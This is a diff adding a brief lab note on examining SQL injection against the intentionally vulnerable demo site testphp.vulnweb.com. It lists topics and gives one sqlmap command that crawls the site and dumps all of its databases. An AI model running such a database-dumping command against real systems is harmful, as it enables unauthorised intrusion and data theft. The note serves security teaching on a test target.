@@ -1,0 +1,12 @@
+Aim: Examine SQL Injection
+1. Bypassing Authentication using SQL injection
+2. Extracting Data using the UNION attack
+3. Blind SQL injection
+4. Automating SQL injection with SQLMAP tool
+
+Go to Link:  http://testphp.vulnweb.com/
+open parrot/Kali OS, start terminal and input the cmd
+
+sqlmap http://testphp.vulnweb.com/ --batch --crawl=3 --threads 10 --smart --dbs --dump-all
+
+Thanks me Later, You have Successfully performed your experiment
